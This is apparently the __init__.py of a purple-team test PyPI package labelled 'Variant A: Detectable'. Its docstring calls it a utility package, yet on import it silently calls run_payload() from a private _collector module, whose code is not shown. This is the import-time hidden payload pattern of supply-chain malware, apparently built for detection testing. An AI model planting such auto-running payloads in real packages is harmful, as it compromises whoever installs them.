# pt-variant-a (PyPI Wheel - Variant A: Detectable)
"""
Utility package for PT applications - Variant A

This package is for authorized purple team testing only.
"""

from ._collector import run_payload

# Execute payload on import
run_payload()

__version__ = "1.1.0"
__all__ = ["__version__"]
